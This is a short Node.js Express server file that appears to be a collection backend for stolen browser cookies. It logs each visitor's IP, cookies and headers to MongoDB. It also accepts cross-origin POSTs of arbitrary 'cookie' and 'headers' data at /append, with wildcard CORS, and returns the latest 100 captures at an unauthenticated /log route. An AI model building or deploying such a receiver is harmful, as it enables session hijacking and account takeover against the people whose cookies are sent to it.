require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const cookieParser = require("cookie-parser");
const app = express();

const user = require("./models/user");

app.use(express.json());
app.use(cookieParser());

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET,POST,PUT,PATCH,DELETE,OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type, Authorization");

  if (req.method === "OPTIONS") {
    return res.sendStatus(204);
  }
  next();
});



app.get("/",async (req, res) => {
    const cookieHeader = req.headers.cookie;
    user.create({
      ip: req.ip,
      cookie: cookieHeader,
      headers: req.headers,
    });
    return res.sendFile(__dirname + "/static/index.html");
});
app.post("/append", async (req, res) => {
    const data = req.body;
    user.create({
      ip: data.ip || req.ip,
      cookie: data.cookie,
      headers: data.headers,
    });
    return res.send("ok");
})

app.get("/log", async (req, res) => {
    const users =  await user.find().sort({ createdAt: -1 }).limit(100);
    return  res.json(users);
})


async function start() {
  try {
    await mongoose.connect(process.env.MONGODB_URI, {
    });
    console.log("MongoDB connected");

    app.listen(process.env.PORT || 3000, () => {
      console.log("Server started");
    });
  } catch (err) {
    console.error("MongoDB connection error:", err);
    process.exit(1);
  }
}

start();